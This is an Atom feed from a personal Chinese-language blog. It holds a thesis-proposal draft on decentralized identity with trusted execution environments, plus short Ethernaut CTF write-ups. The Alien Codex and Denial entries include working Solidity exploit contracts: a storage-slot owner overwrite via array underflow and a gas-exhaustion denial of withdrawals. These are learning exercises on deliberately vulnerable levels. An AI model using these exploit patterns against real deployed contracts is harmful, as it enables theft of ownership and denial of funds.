<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cishoon&#39;s Blog</title>
  
  
  <link href="http://cishoon.top/atom.xml" rel="self"/>
  
  <link href="http://cishoon.top/"/>
  <updated>2024-12-28T05:31:31.415Z</updated>
  <id>http://cishoon.top/</id>
  
  <author>
    <name>Cishoon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ethernaut - Dex</title>
    <link href="http://cishoon.top/ethernaut/23-Dex/"/>
    <id>http://cishoon.top/ethernaut/23-Dex/</id>
    <published>2024-12-27T16:00:00.000Z</published>
    <updated>2024-12-28T05:31:31.415Z</updated>
    
    <content type="html"><![CDATA[<p>分布式交易合约，偷光所有钱。感觉有点同质化了，没啥意思）</p><span id="more"></span><p>swapAmount 是用 IERC20 算的，</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;分布式交易合约，偷光所有钱。感觉有点同质化了，没啥意思）&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>毕设14 - 开题答辩</title>
    <link href="http://cishoon.top/graduation-project/14/"/>
    <id>http://cishoon.top/graduation-project/14/</id>
    <published>2024-12-24T16:00:00.000Z</published>
    <updated>2025-01-03T11:04:31.303Z</updated>
    
    <content type="html"><![CDATA[<p>写开题答辩。毕业设计切换要点，不是 TEE + Wasm了，而侧重于分布式数字身份 + TEE。</p><p>前面毕业实训的东西算是白写了，但是自己是熟悉了 TEE 和Cosmos，也有作用吧。（自我安慰）</p><p>开题答辩重新把 DID 的东西拿进来。</p><span id="more"></span><h1 id="毕业设计论文课题背景">1 毕业设计（论文）课题背景</h1><p>随着数字化服务的日益发展，用户在数字世界中的身份管理和隐私保护问题成为亟待解决的挑战。传统的身份认证系统大多依赖于中心化服务器，存在单点故障风险，且用户的隐私数据易被不当获取和滥用。为了解决这一问题，分布式数字身份（DecentralizedIdentity， DID）系统应运而生，它利用区块链的去中心化特性，实现了用户对自己身份信息的自主控制。<u>然而，尽管区块链技术一定程度上实现了数字身份的去中心化，但其传统智能合约的透明性，以及存在的诸多安全隐患，影响了分布式数字身份的安全性于可信度。</u></p><p>郑星云同学的本科毕业论文，拟对当前的分布式数字身份系统方案进行基本学习，并结合可信执行环境，对目前分布式数字身份系统进行优化，在提升系统安全性的同时保证运行效率。最终将实现一个基于分布式数字身份的应用场景原型，进一步验证本课题系统的实际可用性和拓展性。</p><h2 id="论文选题背景及选题意义">1.1 论文选题背景及选题意义</h2><h3 id="论文选题背景">1.1.1 论文选题背景</h3><p>随着数字化转型的深入，数字身份管理和隐私保护问题日益突出。同时区块链技术的兴起，给数字身份管理提供了新的解决思路——分布式数字身份。然而现有的分布式数字身份系统仍一定程度上存在着安全性问题，因此提升分布式数字身份系统的安全性与效率成为当前研究的重要方向。</p><h3 id="论文选题意义">1.1.2 论文选题意义</h3><p>本选题的研究内容包括分布式数字身份系统的架构设计、结合可信执行环境对系统安全性进行优化、分布式数字身份系统在可信执行环境中的实现与性能测试等。研究结果将有助于提升分布式数字身份系统的安全性和可信度，为数字身份管理应用提供更加安全、可靠的技术基础。</p><p>分布式数字身份（Decentralized DigitalIdentity，DID）作为一种新兴的身份认证技术，能够实现用户对自身身份信息的自主控制，减少中心化系统带来的单点故障风险和隐私泄露问题。随着区块链技术的发展，DID系统在各类数字服务中的应用逐渐增多，尤其在金融、医疗和政府等领域，提升了身份管理的安全性和效率。然而，现有的DID系统仍然面临智能合约透明性问题、数据泄露风险及网络攻击等安全隐患。因此，如何通过技术创新提升系统的安全性和可信度，成为当前研究的重要方向。</p><p>可信执行环境（Trusted Execution Environment，TEE）作为一种硬件级的安全技术，能够提供隔离的执行环境，确保敏感数据和计算过程的安全性。在DID系统中结合TEE技术，不仅可以有效防止数据泄露和篡改，还能保障智能合约执行的安全性。本研究旨在设计与优化适用于DID系统的TEE架构，提高系统在安全性、效率和可扩展性等方面的表现。通过研究与实现DID系统在TEE中的部署和性能优化，能够进一步提升系统的应用价值，确保用户隐私和身份信息的安全。</p><p>本研究的成果将为数字身份管理提供更加安全、高效的解决方案，推动DID系统的广泛应用，增强其在数字经济时代的竞争力。</p><h2 id="国内外研究现状">1.2 国内外研究现状</h2><p>DID系统的设计与优化是区块链技术与数字身份管理领域的一个重要研究方向。随着数字化服务的广泛应用和对隐私保护的日益重视，数字身份管理在各类应用中的需求不断增加。为了提高DID系统的安全性和效率，研究人员一直在探索结合TEE技术的优化方案。以下是国内外研究现状的分析：</p><p>目前，数字身份的研究经历了从传统的集中式身份认证到分布式身份系统的演变。传统的集中式数字身份依赖于中心化机构进行身份认证，存在隐私泄露和单点故障等风险。为了解决这些问题，联盟身份（如企业间的联合认证）应运而生，但仍然依赖于中心化的信任机构。近年来，DID作为一种去中心化的身份管理方式，逐渐成为研究热点。W3C（万维网联盟）牵头制定了DID标准，为数字身份提供了开放、透明的技术框架，支持用户自主控制其身份信息。DID的优势在于其去中心化特性，能够有效减少对第三方机构的依赖，提升隐私保护和系统安全性。</p><p>TEE是一种通过硬件隔离保护敏感数据和计算的安全技术。Intel SGX和ArmTrustZone是两种主流的TEE技术。IntelSGX通过创建受保护的“安全区域”保护应用执行，而ArmTrustZone将处理器分为信任和非信任区域，确保数据安全。两者在保护数字身份和敏感信息方面具有重要应用。</p><p>在全球范围内，DID技术正得到快速应用和落地实施。美国的互联网巨头和初创企业已率先利用DID实现跨系统的身份认证和数字资产交易，微软、IBM、区块链联盟R3、埃森哲等103家企业和机构已完成DID系统的实现与应用。英国的奥卡姆公司设计了基于区块链的物联网设备身份平台，推动设备间的身份认证和数据互操作。此外，各国企业积极联合成立DID相关基金会和产业联盟，如LinuxFoundation、Sovrin Foundation和SSIMeetup，推动产业生态的建设。在中国，百度、微众银行、中国信息通信研究院等单位已自主研发DID产品和解决方案，并成功注册于W3C相关标准，成为全球DID方案的一部分。中国信息通信研究院牵头搭建了国内最大的DID工程化平台“星火·链网”，华为也基于DID技术构建了其分布式身份服务平台TDIS，推动了国内DID体系的建设与应用。</p><h3 id="区块链技术">1.2.1 区块链技术</h3><p>区块链技术作为DID系统的基础，为数据存储和管理提供了可靠的支持。通过其分布式、不可篡改和透明的特性，区块链确保了身份数据的安全性和完整性。</p><p>区块链的分布式特性使得所有节点共同维护账本，避免了单点故障的风险。每个节点持有账本的完整副本，确保了数据的高可用性和可靠性。不可篡改性是区块链的核心优势之一，每个区块都包含前一个区块的哈希值，形成链式结构，任何篡改都需同时修改所有后续区块，几乎无法实现。此外，通过加密技术和哈希函数，区块链保证了数据的完整性。</p><p>智能合约是区块链技术的另一个重要应用，它通过数字化的协议自动执行合约条款，无需中介机构的参与。智能合约代码由特定编程语言（如Solidity、Go、JavaScript等）编写，并部署到区块链上。合约的内容和状态一旦部署，便成为不可篡改的一部分。智能合约可以在特定条件下自动执行相关操作，并将执行结果记录在区块链中，确保透明性和不可篡改性。</p><h3 id="数字身份技术">1.2.2 数字身份技术</h3><p>&lt;留着，把那论文里的几个&gt;（备选，可以修改成论文里集中分布式数字身份的现有系统）</p><p>传统的数字身份系统采用中心化和集中化的管理模式，用户身份信息存储在少数几个服务器上，由服务提供商统一管理。这种模式存在一些问题：（1）单点故障：若服务器出现故障或遭遇攻击，整个系统的安全性和可用性会受到影响；（2）隐私风险：集中存储的用户信息容易成为攻击目标，一旦泄露，用户隐私将面临严重威胁；（3）信任问题：用户必须完全信任身份提供者，但提供者可能滥用数据；（4）数据孤岛：不同平台之间缺乏互操作性，用户需重复注册，增加了管理负担。</p><p>为了克服这些问题，联盟身份应运而生。联盟身份通过区块链技术将身份数据分散存储在多个独立组织的节点上，避免了单点故障，并提高了系统的安全性和可靠性。用户的数字身份可以在多个成员组织之间共享和验证，解决了重复注册的问题，同时增强了隐私保护。然而，联盟身份也面临一些挑战：（1）数据垄断：联盟中的中心节点可能掌握大量用户信息，存在隐私泄露的风险；（2）隐私风险：多个组织共享用户身份信息，一旦某个节点遭遇攻击，用户隐私可能被泄露；（3）数据集中：尽管解决了互操作性问题，但数据过度集中于联盟成员，增加了系统的安全风险。</p><p>分布式数字身份（Decentralized DigitalIdentity）是基于区块链和分布式账本技术的新型身份管理模式。在这种模式下，身份数据分散存储在分布式网络中，利用密码学技术和共识机制确保数据的安全性和不可篡改性。分布式数字身份相比于传统的中心化身份和联盟身份，具有明显优势：（1）隐私安全：身份数据通过加密保护，用户可以选择性披露信息，避免隐私泄露；（2）身份自主管理：用户对身份数据拥有完全的控制权，无需依赖第三方机构；（3）身份可移植性：用户的身份不依赖于特定服务提供商，可以在不同平台之间自由迁移；（4）可信数据交换：区块链技术保证数据的完整性和不可篡改性，确保身份数据交换的可信度。</p><h3 id="可信执行环境">1.2.3 可信执行环境</h3><p>可信执行环境（TEE）是一种通过硬件隔离的安全计算环境，专门用于保护敏感数据和计算过程的机密性与完整性。在TEE中，应用程序可以在“安全世界”中运行，这个区域与常规操作系统隔离，避免了不受信的环境对敏感信息的访问或篡改。通过这种方式，TEE能够防止恶意软件和攻击者窃取或篡改数据，广泛应用于数字身份保护、支付安全、加密操作等领域。</p><p>ArmTrustZone是目前应用最广泛的TEE实现之一。TrustZone将处理器划分为两个区域：安全世界和非安全世界。安全世界提供一个受保护的执行环境，运行敏感任务和存储重要数据，而非安全世界则执行普通任务和运行非敏感应用。通过硬件级别的隔离，TrustZone有效确保即使非安全世界受到攻击，安全世界中的数据和代码也不会受到影响。TrustZone的低开销和高效性使其在移动设备和嵌入式设备中得到了广泛应用，能够为各种安全功能提供支持，如加密、身份验证、数字签名等。</p><p>然而，TrustZone并非没有局限性。虽然它能够提供硬件隔离，但其安全性和性能表现依赖于底层硬件和固件的质量。如果硬件或固件存在漏洞，整个TEE的安全性就会受到威胁。此外，TrustZone的安全世界与非安全世界之间的上下文切换可能会对系统性能产生一定的影响。</p><p>为了更好地支持和管理TEE环境，特别是在开源和嵌入式系统中，OP-TEE（OpenPortable Trusted ExecutionEnvironment）应运而生。OP-TEE是一个开源的、基于ArmTrustZone的TEE实现，它为开发人员提供了一个灵活、可定制的安全环境。OP-TEE通过为应用程序提供可信的执行环境，确保敏感操作如密钥管理、数字签名、加密解密等可以在受保护的环境中进行，而不暴露给不受信的操作系统或应用程序。</p><p>总结来说，ArmTrustZone和OP-TEE作为目前最常见的TEE实现，通过硬件隔离和受保护的执行环境，有效提升了数据安全性，防止了数据泄露和恶意篡改。虽然存在一定的局限性和性能开销，但其在安全性和灵活性上的优势使其成为保护敏感数据和计算过程的重要工具。</p><h1 id="毕业设计方案介绍">2 毕业设计方案介绍</h1><h2 id="论文研究目标">2.1 论文研究目标</h2><p>本研究的主要目标是优化分布式数字身份系统，结合可信执行环境提升系统的安全性与效率。首先，深入理解分布式数字身份系统的原理，分析现有系统的不足；其次，研究可信执行环境的技术，设计一种能够提升分布式数字身份系统安全性的优化方案；最后，在可信执行环境中实现并测试该系统，验证其安全性和性能，确保其在实际应用中的可行性和高效性。</p><h2 id="论文研究内容">2.2 论文研究内容</h2><p>本研究主要分为四个部分。</p><p>首先，研究分布式数字身份系统的原理，分析现有数字身份技术的优缺点，重点讨论区块链技术在数字身份系统中的应用，以及TEE如何提升系统的安全性。将深入理解当前系统方案，并识别其中的安全隐患。</p><p>然后，学习并理解可信执行环境的工作原理，重点研究Intel SGX和ArmTrustZone等技术。探讨如何将这些技术应用于分布式数字身份系统中，以提高数据安全性和身份验证的可信度。</p><p>接下来，进行系统优化设计，结合可信执行环境对分布式数字身份系统进行性能优化，确保在提升安全性的同时不影响系统的运行效率。此部分将涉及对不同系统架构的分析和性能调优。</p><p>最后，将在实际环境中进行系统实现和性能测试，包括对不同设备和平台下系统的可行性验证、性能评估以及结果分析，确保优化后的系统能够在实际应用中高效、安全地运行。</p><h2 id="论文拟采取的研究方法技术路线">2.3论文拟采取的研究方法、技术路线</h2><p>（1）文献调研：为了深入理解分布式数字身份系统的相关技术，将查阅国内外关于区块链技术、数字身份管理、可信执行环境（TEE）等领域的文献。重点学习和掌握当前主流的分布式数字身份系统架构、协议及其优缺点，并分析可信执行环境如何增强系统的安全性。</p><p>（2）技术调研与方案分析：调研当前市场上主流的分布式数字身份系统方案及其安全机制，重点分析区块链技术（如Ethereum、Hyperledger、Cosmos等）和可信执行环境（如IntelSGX、ArmTrustZone等）在实际应用中的实现方式与挑战。对比不同方案的性能、可扩展性与安全性，为优化设计提供技术参考。</p><p>（3）系统架构设计：根据调研结果，设计分布式数字身份系统的架构，结合可信执行环境（TEE）对系统进行优化。在设计过程中，将考虑系统的安全性、隐私保护、可扩展性等多方面因素，并明确具体的技术实现路线和安全优化措施。</p><p>（4）实验与性能测试：在可信执行环境中实现优化后的分布式数字身份系统，进行实际测试与性能评估。通过创建测试用例和数据集，验证系统在不同场景下的安全性、效率和可靠性。对系统进行性能调优，确保其在不同硬件和平台上的表现符合预期要求。</p><p>（5）系统实现与应用验证：将设计的系统进行落地实现，针对实际应用场景进行验证。通过对比不同设备和环境下的性能表现，进一步优化系统架构，确保分布式数字身份系统能够高效、安全地在实际环境中运行，并验证其实际可行性和拓展性。</p><h1 id="参考文献">3 参考文献</h1><p>毕丹阳, 景越, 李婧璇, 李海花. (2021).分布式数字身份及其在工业互联网中的应用. 信息通信技术与政策,<em>2021(10)</em>, 7–12.</p><p>冉津豪, &amp; 蔡栋梁. (2023).基于区块链和可信执行环境的属性签名身份认证方案. 计算机研究与发展,<em>60</em>(11), 2555–2566.</p><p>帅峰云, 黄腾, &amp; 宋洋. (2018).<em>手机安全与可信应用开发指南：TrustZone和OP-TEE技术详解</em>.机械工业出版社.</p><p>Androulaki, E., Barger, A., Bortnikov, V., Cachin, C., Christidis,K., De Caro, A., Enyeart, D., Ferris, C., Laventman, G., Manevich, Y.,Muralidharan, S., Murthy, C., Nguyen, B., Sethi, M., Singh, G., Smith,K., Sorniotti, A., Stathakopoulou, C., Vukolić, M., … Yellick, J.(2018). Hyperledger fabric: A distributed operating system forpermissioned blockchains. <em>Proceedings of the Thirteenth EuroSysConference</em>, 1–15. https://doi.org/10.1145/3190508.3190538</p><p>Costan, V., &amp; Devadas, S. (2016). <em>Intel SGX Explained</em>(No. 2016/086). Cryptology ePrint Archive.https://eprint.iacr.org/2016/086</p><p><em>Decentralized Identifiers (DIDs) v1.0</em>. (不详). 取读于2024年12月1日, 从 https://www.w3.org/TR/did-core/</p><p>Dib, O., &amp; Rababah, B. (2020). Decentralized Identity Systems:Architecture, Challenges, Solutions and Future Directions. <em>Annals ofEmerging Technologies in Computing (AETiC)</em>, <em>4</em>(5), Article5. https://doi.org/10.33166/AETiC.2020.05.002</p><p>Fynn, E., Bessani, A., &amp; Pedone, F. (2020). <em>Smart Contractson the Move</em> (No. arXiv:2004.05933). arXiv.https://doi.org/10.48550/arXiv.2004.05933</p><p>Jian, Z., Lu, Y., Qiao, Y., Fang, Y., Xie, X., Yang, D., Zhou, Z.,&amp; Li, T. (2023). TSC-VEE: A TrustZone-Based Smart Contract VirtualExecution Environment. <em>IEEE Transactions on Parallel and DistributedSystems</em>, <em>34</em>(6), 1773–1788. IEEE Transactions on Paralleland Distributed Systems. https://doi.org/10.1109/TPDS.2023.3263882</p><p>Kwon, J., &amp; Buchman, E. (2020, 十二月 29). <em>CosmosWhitepaper</em>.https://wikibitimg.fx994.com/attach/2020/12/16623142020/WBE16623142020_55300.pdf</p><p>Li, R., Wang, Q., Wang, Q., Galindo, D., &amp; Ryan, M. (2022).<em>SoK: TEE-assisted Confidential Smart Contract</em> (No.arXiv:2203.08548). arXiv. https://doi.org/10.48550/arXiv.2203.08548</p><p>Liu, C., Guo, H., Xu, M., Wang, S., Yu, D., Yu, J., &amp; Cheng, X.(2022). Extending On-Chain Trust to Off-Chain – Trustworthy BlockchainData Collection Using Trusted Execution Environment (TEE). <em>IEEETransactions on Computers</em>, <em>71</em>(12), 3268–3280. IEEETransactions on Computers. https://doi.org/10.1109/TC.2022.3148379</p><p>Maldonado-Ruiz, D., Torres, J., El Madhoun, N., &amp; Badra, M.(2021). An Innovative and Decentralized Identity Framework Based onBlockchain Technology. <em>2021 11th IFIP International Conference onNew Technologies, Mobility and Security (NTMS)</em>, 1–8.https://doi.org/10.1109/NTMS49979.2021.9432656</p><p>Mohanta, B. K., Panda, S. S., &amp; Jena, D. (2018). An Overview ofSmart Contract and Use Cases in Blockchain Technology. <em>2018 9thInternational Conference on Computing, Communication and NetworkingTechnologies (ICCCNT)</em>, 1–4.https://doi.org/10.1109/ICCCNT.2018.8494045</p><p>Mukhtar, M. A., Bhatti, M. K., &amp; Gogniat, G. (2019).Architectures for Security: A comparative analysis of hardware securityfeatures in Intel SGX and ARM TrustZone. <em>2019 2nd InternationalConference on Communication, Computing and Digital systems(C-CODE)</em>, 299–304. https://doi.org/10.1109/C-CODE.2019.8680982</p><p>Nehal, A., &amp; Ahlawat, P. (2019). Securing IoT applications withOP-TEE from hardware level OS. <em>2019 3rd International conference onElectronics, Communication and Aerospace Technology (ICECA)</em>,1441–1444. https://doi.org/10.1109/ICECA.2019.8822040</p><p><em>OP-TEE/optee_os</em>. (2024). [C]. OP-TEE.https://github.com/OP-TEE/optee_os (Original work published 2014)</p><p>Pinto, S., &amp; Santos, N. (2019). Demystifying Arm TrustZone: AComprehensive Survey. <em>ACM Comput. Surv.</em>, <em>51</em>(6),130:1-130:36. https://doi.org/10.1145/3291047</p><p>Ramić, Š. B., Prazina, I., Pozderac, D., Mulahasanović, R. T., &amp;Mrdović, S. (2024). <em>Selective disclosure of claims from multipledigital credentials</em> (No. arXiv:2402.15447). arXiv.https://doi.org/10.48550/arXiv.2402.15447</p><p>Ren, M., Yin, Z., Ma, F., Xu, Z., Jiang, Y., Sun, C., Li, H., &amp;Cai, Y. (2021). Empirical evaluation of smart contract testing: What isthe best choice? <em>Proceedings of the 30th ACM SIGSOFT InternationalSymposium on Software Testing and Analysis</em>, 566–579.https://doi.org/10.1145/3460319.3464837</p><p>Rouhani, S., &amp; Deters, R. (2019). Security, Performance, andApplications of Smart Contracts: A Systematic Survey. <em>IEEEAccess</em>, <em>7</em>, 50759–50779. IEEE Access.https://doi.org/10.1109/ACCESS.2019.2911031</p><p>Van Schaik, S., Seto, A., Yurek, T., Batori, A., AlBassam, B.,Genkin, D., Miller, A., Ronen, E., Yarom, Y., &amp; Garman, C. (2024).SoK: SGX.Fail: How Stuff Gets eXposed. <em>2024 IEEE Symposium onSecurity and Privacy (SP)</em>, 4143–4162.https://doi.org/10.1109/SP54263.2024.00260</p><p><em>Verifiable Credentials Data Model v1.1</em>. (不详). 取读于2024年12月1日, 从 https://www.w3.org/TR/vc-data-model/</p><p>Zichichi, M., Bomprezzi, C., Sorrentino, G., &amp; Palmirani, M.(2023). <em>Protecting digital identity in the Metaverse: The case ofaccess to a cinema in Decentraland</em>. International Conference onDevelopments in Language Theory.https://www.semanticscholar.org/paper/Protecting-digital-identity-in-the-Metaverse%3A-the-a-Zichichi-Bomprezzi/9df5f7d524a39db1781abd394a0a5a4b1eec31d1</p><p>Zou, W., Lo, D., Kochhar, P. S., Le, X.-B. D., Xia, X., Feng, Y.,Chen, Z., &amp; Xu, B. (2021). Smart Contract Development: Challengesand Opportunities. <em>IEEE Transactions on Software Engineering</em>,<em>47</em>(10), 2084–2106. IEEE Transactions on Software Engineering.https://doi.org/10.1109/TSE.2019.2942301</p><h1 id="ppt">PPT</h1><p>目录：</p><ul><li>选题背景及意义</li><li>国内外研究现状</li><li>主要研究内容</li><li>时间及工作安排</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;写开题答辩。毕业设计切换要点，不是 TEE + Wasm
了，而侧重于分布式数字身份 + TEE。&lt;/p&gt;
&lt;p&gt;前面毕业实训的东西算是白写了，但是自己是熟悉了 TEE 和
Cosmos，也有作用吧。（自我安慰）&lt;/p&gt;
&lt;p&gt;开题答辩重新把 DID 的东西拿进来。&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://cishoon.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="毕设" scheme="http://cishoon.top/tags/%E6%AF%95%E8%AE%BE/"/>
    
    <category term="答辩" scheme="http://cishoon.top/tags/%E7%AD%94%E8%BE%A9/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Recovery</title>
    <link href="http://cishoon.top/ethernaut/18-Recovery/"/>
    <id>http://cishoon.top/ethernaut/18-Recovery/</id>
    <published>2024-12-23T16:00:00.000Z</published>
    <updated>2024-12-24T08:57:20.565Z</updated>
    
    <content type="html"><![CDATA[<p>过半了，快做完了。</p><p>一个合约创建者构建了一个非常简单的代币工厂合约。任何人都可以轻松创建新的代币。在部署第一个代币合约后，创建者发送了0.001以太币以获得更多的代币。此后，他们失去了合约地址。如果可以从丢失的合约地址中恢复（或删除）0.001以太币，则此级别将完成。</p><span id="more"></span><p>重点是，核心是区块链上的所有交易都是有记录的……在区块链浏览器里找一下就找到了。</p><p>但是感觉有点作弊，这题应该是想让我们了解智能合约的地址是怎么创建的。</p><p>这题的提示更有意思，因为智能合约创建的地址是可预测的，可以提前给这个地址发一些以太币，然后再在这个地址上创建智能合约，智能合约初始就拿到了这隐藏的钱。</p><p><strong>创建者地址</strong>：这是部署合约的账户的地址（通常是外部拥有账户EOA的地址）。</p><p><strong>Nonce</strong>：这是该地址已发送交易的数量，表示该地址的交易计数器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address = keccak256(RLP(创建者地址 + nonce))[12:]</span><br></pre></td></tr></table></figure><p>RLP 表示对数据进行 <strong>递归长度前缀编码</strong>（RLPEncoding）。即对创建者地址和nonce进行编码。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;过半了，快做完了。&lt;/p&gt;
&lt;p&gt;一个合约创建者构建了一个非常简单的代币工厂合约。任何人都可以轻松创建新的代币。在部署第一个代币合约后，创建者发送了0.001以太币以获得更多的代币。此后，他们失去了合约地址。如果可以从丢失的合约地址中恢复（或删除）0.001以太币，则此级别将完成。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - MagicNumber</title>
    <link href="http://cishoon.top/ethernaut/19-MagicNumber/"/>
    <id>http://cishoon.top/ethernaut/19-MagicNumber/</id>
    <published>2024-12-23T16:00:00.000Z</published>
    <updated>2024-12-24T09:09:28.571Z</updated>
    
    <content type="html"><![CDATA[<p>创建一个10字节的智能合约……</p><span id="more"></span><p>这题要学会怎么写原生的EVM字节码。</p><p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p><p>这个暂时不展开学习了，肯定得花一些时间。可以参考上面这个详细教程。</p><p>另外发现了好玩的：教你EVM字节码的游戏https://stermi.xyz/blog/lets-play-evm-puzzles</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>({<span class="attr">from</span>:player,<span class="attr">data</span>:<span class="string">"0x600a600c600039600a6000f3602A60805260206080f3"</span>});</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;创建一个10字节的智能合约……&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Alien Codex</title>
    <link href="http://cishoon.top/ethernaut/20-Alien-Codex/"/>
    <id>http://cishoon.top/ethernaut/20-Alien-Codex/</id>
    <published>2024-12-23T16:00:00.000Z</published>
    <updated>2024-12-24T11:20:07.912Z</updated>
    
    <content type="html"><![CDATA[<p>和外星人交流，获得owner权。</p><span id="more"></span><p>思路就是先找哪里有可以攻击的地方。这个函数，可以修改一个数组中的值，我只要让codex[i]对应的内存空间位置变成owner 的位置即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function revise(uint256 i, bytes32 _content) public contacted {</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>动态数组，slot里存数组长度，keccak256(slot) + i的值就是第i个元素的槽位。</p><p>计算出 <code>keccak256(slot) + i</code> 在什么时候 = 0。</p><p>slot[0] 里存两个值 contracted 和 owner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000000000000001_0bc04aa6aac163a6b3667636d798fa053d43bd11</span><br></pre></td></tr></table></figure><p>只要把slot改成我的地址即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000000000000000_E484608fA7639996d0F359f76f34DF9fe15f7F7B</span><br></pre></td></tr></table></figure><p>还有设置数组会检测数组长度，所以先让他下溢，把数组长度开满。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">retract</span>() <span class="comment">// 下溢让数组长度爆了</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack {</span><br><span class="line">    address public target;</span><br><span class="line">    uint256 public log;</span><br><span class="line">    constructor(address _target) {</span><br><span class="line">        target = _target;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function attack() public {</span><br><span class="line">        AlienCodex codex = AlienCodex(target);</span><br><span class="line">        uint256 i = (~uint256(0)) - uint256(keccak256(abi.encode(1))) + 1;</span><br><span class="line">        codex.revise(i, 0x000000000000000000000000E484608fA7639996d0F359f76f34DF9fe15f7F7B);</span><br><span class="line">    } </span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;和外星人交流，获得owner权。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Denial</title>
    <link href="http://cishoon.top/ethernaut/21-Denial/"/>
    <id>http://cishoon.top/ethernaut/21-Denial/</id>
    <published>2024-12-23T16:00:00.000Z</published>
    <updated>2024-12-24T11:49:22.453Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个简单的钱包，随着时间的推移会慢慢滴出资金。你可以通过成为提取合作伙伴来慢慢提取资金。如果你能在所有者调用withdraw（） 时拒绝他们提取资金（当合约仍有资金，且交易费用为1Mgas或更少）时，你将赢得这一级别。</p><span id="more"></span><p>不能用重入攻击提取完所有资金，因为要求合约有资金但是不能被提取，而且有gas 限制。</p><p>想多了，就是消耗完gas就行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface IDenial {</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Denial {</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) {</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive()  external payable {</span><br><span class="line">        IDenial(levelInstance).withdraw();</span><br><span class="line">        int sum = 0;</span><br><span class="line">        for (int i = 0; i &lt; 100000; i++) {</span><br><span class="line">            sum += i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function withdraw() public payable {</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是一个简单的钱包，随着时间的推移会慢慢滴出资金。你可以通过成为提取合作伙伴来慢慢提取资金。如果你能在所有者调用
withdraw（） 时拒绝他们提取资金（当合约仍有资金，且交易费用为1M
gas或更少）时，你将赢得这一级别。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Shop</title>
    <link href="http://cishoon.top/ethernaut/22-Shop/"/>
